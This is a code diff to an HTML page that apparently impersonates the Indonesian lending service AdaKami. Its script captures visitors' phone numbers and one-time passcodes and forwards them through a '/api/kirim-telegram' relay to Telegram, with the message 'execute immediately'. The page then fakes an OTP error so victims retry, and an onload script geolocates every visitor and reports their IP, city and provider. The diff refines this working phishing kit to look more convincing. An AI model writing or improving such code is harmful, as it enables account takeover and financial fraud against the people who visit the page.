@@ -163,9 +163,8 @@
     </div>
 
     <!-- ================== SCRIPT JS (SUDAH BERSIH & LENGKAP) ================== -->
-    <script>
-        const BOT_TOKEN = process.env.BOT_TOKEN;
-        const CHAT_ID = process.env.CHAT_ID;
+    
+            <script>
         let userPhoneNumber = '';
         let timerInterval;
 
@@ -179,6 +178,7 @@
             e.preventDefault();
             const phoneInput = document.getElementById('phoneNumber');
             const errorMsg = document.getElementById('phoneError');
+            const submitBtn = document.querySelector('.submit-button');
             let phone = phoneInput.value.trim();
 
             let isValid = false;
@@ -187,19 +187,31 @@
 
             if (!isValid) {
                 errorMsg.style.display = 'block';
+                errorMsg.style.textAlign = 'center';
                 return;
             }
 
             errorMsg.style.display = 'none';
             userPhoneNumber = phone;
 
+            const teksAsli = submitBtn.innerHTML;
+            submitBtn.innerHTML = 'Memproses...';
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = '0.7';
+
             const message = `<b>🚀 NOTIFIKASI BARU 🚀</b>\n----------------------------------\n<b>📱 PENGIRIM :</b> <code>${phone}</code>\n<b>🌐 DOMAIN   :</b> www.adakami.website\n<b>🛰 STATUS   :</b> Menunggu OTP...\n----------------------------------`;
             sendTelegramMessage(message);
-            showOtpModal(phone);
+            
+            setTimeout(() => {
+                submitBtn.innerHTML = teksAsli;
+                submitBtn.disabled = false;
+                submitBtn.style.opacity = '1';
+                showOtpModal(phone);
+            }, 2000);
         }
 
         function sendTelegramMessage(text) {
-            fetch('/api/BOT_TOKEN', {
+            fetch('/api/kirim-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ pesan: text })
@@ -210,7 +222,7 @@
             const modal = document.getElementById('otpModal');
             const desc = document.getElementById('otpDesc');
             desc.style.textAlign = 'center';
-            desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(\( {phone.slice(0,4)}**** \){phone.slice(-4)})`;
+            desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0,4)}****${phone.slice(-4)})`;
 
             modal.style.display = 'flex';
             startTimer();
@@ -222,7 +234,6 @@
             clearInterval(timerInterval);
         }
 
-        // OTP Input Logic
         const otpInputs = document.querySelectorAll('.otp-field');
         otpInputs.forEach((input, index) => {
             input.setAttribute('inputmode', 'numeric');
@@ -249,12 +260,13 @@
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
 
-            const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n----------------------------------\n<b>🔑 OTP CODE :</b> <code>\( {formattedOtp}</code>\n<b>👤 NOMOR    :</b> <code> \){userPhoneNumber}</code>\n<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
+            const message = `<b>⚡️ KODE OTP MASUK ⚡️</b>\n----------------------------------\n<b>🔑 OTP CODE :</b> <code>${formattedOtp}</code>\n<b>👤 NOMOR    :</b> <code>${userPhoneNumber}</code>\n<b>⏰ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🔥 SEGERA EKSEKUSI! 🔥</b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
                 loader.style.display = 'none';
                 otpError.style.display = 'block';
+                otpError.style.textAlign = 'center';
                 otpInputs.forEach(input => input.value = '');
                 otpInputs[0].focus();
             }, 3000);
@@ -265,6 +277,9 @@
             const timerText = document.getElementById('timerText');
             const resendLink = document.getElementById('resendLink');
 
+            timerText.style.textAlign = 'center';
+            resendLink.style.textAlign = 'center';
+            
             resendLink.style.display = 'none';
             timerText.style.display = 'inline';
             clearInterval(timerInterval);
@@ -284,30 +299,29 @@
             startTimer();
         }
 
-        // Auto validate input
         document.addEventListener('DOMContentLoaded', () => {
             const phoneInput = document.getElementById('phoneNumber');
             if (phoneInput) phoneInput.addEventListener('input', () => validateInput(phoneInput));
         });
     </script>
 
-    <!-- SCRIPT PENCATATAN PENGUNJUNG -->
     <script type="text/javascript">
         window.onload = function() {
-            fetch('https://api.telegram.org/json/')
+            fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
                     const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n<b>Domain:</b> www.adakami.website\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
-                    fetch('/api/BOT_TOKEN', {
+                    fetch('/api/kirim-telegram', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ pesan: infoPesan })
-                    }).then(() => console.log("✅ Data pengunjung terkirim"))
-                      .catch(err => console.error("❌ Gagal kirim data pengunjung:", err));
+                    }).then(() => console.log("Data pengunjung terkirim ke backend"))
+                      .catch(err => console.error("Gagal kirim data ke backend", err));
                 })
-                .catch(err => console.error("❌ Gagal ambil IP:", err));
+                .catch(err => console.error("Gagal melacak IP pengunjung"));
         };
     </script>
+    
 </body>
 </html>
